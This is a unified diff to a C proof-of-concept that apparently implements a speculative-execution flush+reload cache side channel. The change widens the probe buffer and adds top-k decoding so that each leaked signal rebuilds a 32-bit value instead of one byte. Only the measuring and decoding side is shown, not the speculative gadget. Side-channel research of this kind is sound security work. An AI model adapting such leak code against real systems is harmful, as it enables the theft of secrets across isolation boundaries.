@@ -1,4 +1,5 @@
 #include <stdio.h>
+#include <stdbool.h>
 #include <stdlib.h>
 #include <stdint.h>
 #include <signal.h>
@@ -13,16 +14,16 @@
 // e.g. 256 would be 1 byte of info
 // Tradeoff here is larger bandwidth means we have
 // to check more places in probe_buf (and flush them)
-#define NUM_PROBES 256
+#define NUM_PROBES 1024
 #define DECRYPT_LEN 256
 
+#define MAX_ITERATIONS 2000
 // These define the stride length we take between probes
 // This thwarts a clever CPU's stride prediction
 // (e.g. "you loaded buf[0], buf[1024], I'll load buf[2048] for you")
 // Generally, this results in not seeing ANY winning probes
 // in which case, we change cur_probe_space and retry
 #define MAX_PROBE_SPACE (1000003)
-double avgpct = 0;
 uint64_t __attribute__((section(".cur_probe_space"))) cur_probe_space = 4177;
 
 
@@ -35,7 +36,6 @@ uint8_t __attribute__((section(".probe_buf"))) *probe_buf;
 // This is a simple counter, accessed by the speculative function (target_fn)
 // so it can compute on it.
 uint16_t signal_idx = 0;
-uint64_t instr = 0;
 
 
 // Stats
@@ -77,8 +77,6 @@ void check_probes() {
             cache_hits++;
             tot_time += t1-t0;
             results[i]++;
-            //printf("# %lu\n", t1-t0);
-            //_mm_clflush(addr);
         }
     }
     tot_runs++;
@@ -92,6 +90,79 @@ void check_probes() {
 uint64_t jmp_ptr;
 
 
+// Find the K items in results that have been hit the most often
+bool get_top_k(uint64_t k, uint64_t* output_i, uint64_t* output_res){
+
+    uint64_t top_k[k];
+    uint64_t top_k_res[k];
+    uint64_t min_i=0;
+    uint64_t min_hits_allowed=10;
+    uint64_t hits=0;
+
+    uint64_t i, j, x;
+
+    for ( i=0; i<k; i++){
+        top_k[i]=0;
+        top_k_res[i]=0;
+    }
+
+    for (i=0; i<NUM_PROBES; i++) {
+
+        if (results[i] < min_hits_allowed){
+            continue;
+        }
+        else hits++;
+        // if the result is greater than the current minimum in the Top-K replace it
+        if (results[i] > top_k_res[min_i]){
+            top_k_res[min_i] = results[i];
+            top_k[min_i] = i;
+
+            // Find the new minimum in the Top-K
+            for (j=0; j<k; j++){
+                if (top_k_res[j] < top_k_res[min_i]){
+                    min_i = j;
+                }
+            }
+        }
+    }
+
+    if (hits >= k){
+        for (i=0; i<k; i++){
+            output_i[i] = top_k[i];
+            output_res[i] = top_k_res[i];
+            printf("\t[%04lX]  %ld -- %ld / %d\n",  output_i[i], i, output_res[i],MAX_ITERATIONS); 
+        }
+        return true;
+    } else {
+        return false;
+    }
+}
+
+// Signal32 will use a bitmask on the upper part of each item in the 
+// Top-K items to identify where it goes in the final result. This 
+// reconstructs that result by identifying the bitmasks.
+uint64_t construct_result(uint64_t k, uint64_t width, uint64_t* top_k){
+    uint64_t i, j, bm;
+    uint64_t final_result=0;
+
+    // check each index bitmask up to k
+    for (i = 0; i < k; i++){
+
+        // printf("%ld - %03lX\n", i, top_k[i]); 
+        // check each result to see if it matches this bitmask
+        for (j=0; j < k; j++){
+
+            if (top_k[j]>>width == i){
+                // clear the bitmask and BITWISE-OR this block into the correct slot in the final result
+                final_result |= ( top_k[j] ^ (i<<width) ) << (i*width);
+                break;
+            }           
+        }
+    }
+    return final_result;
+}
+
+
 
 void measure() {
     fn_ptr = check_probes;
@@ -100,10 +171,14 @@ void measure() {
     int i;
 
     int misses = 0;
-    uint64_t last_i = 0xff;
+    uint64_t k = 4;
+    uint64_t top_k_i[k]; 
+    uint64_t top_k_res[k]; 
+    uint64_t final_i;
+    bool hit_miss=0;
 
     while (1) {
-        for (i=0; i<2000; i++) {
+        for (i=0; i<MAX_ITERATIONS; i++) {
             _mm_clflush(&fn_ptr);
             //_mm_clflush(&jmp_ptr);
             indirect(&jmp_ptr);
@@ -112,33 +187,22 @@ void measure() {
         }
         uint64_t avg = 0;
         if (cache_hits > 0) avg = tot_time/cache_hits;
+        
+        // the results array is global
+        hit_miss = get_top_k(k, top_k_i, top_k_res);
 
-        uint64_t max_res=0, max_i=0;
-        for (i=0; i<NUM_PROBES; i++) {
-            if (results[i]>max_res) {
-                max_res = results[i];
-                max_i = i;
-            }
-        }
+        if (hit_miss){
+            final_i = construct_result(k, 8, top_k_i); 
+            printf("[%08lX]\n\n", final_i);
 
-        if (max_res > 10 && avg < 50){
-            printf("[%02lx]: %04lu / %lu = %0.5f%% hits, %lu avg cycles, ps %ld, #%03d, %d misses\n",
-                     max_i, max_res, tot_runs, 100*((float)max_res)/tot_runs, avg, cur_probe_space, signal_idx, misses);
-            avgpct += ((float)max_res)/tot_runs;
-
-            last_i = max_i;
             signal_idx++;
-            instr++;
             misses = 0;
             if (signal_idx > DECRYPT_LEN) {
-                avgpct /= DECRYPT_LEN;
-                avgpct *= 100;
-                printf("total avg hit rate = %0.5f%%\n", avgpct);
                 exit(0);
             }
 
         } else {
-            printf("--[%lu]: %lu, %lu avg cycles ps %ld\n", max_i, max_res, avg, cur_probe_space);
+            printf("--[]: %lu avg cycles ps %ld\n", avg, cur_probe_space);
             misses++;
             cur_probe_space += 63;
             cur_probe_space %= MAX_PROBE_SPACE;
@@ -154,6 +218,7 @@ void measure() {
 
 
 }
+
 
 int main()
 {
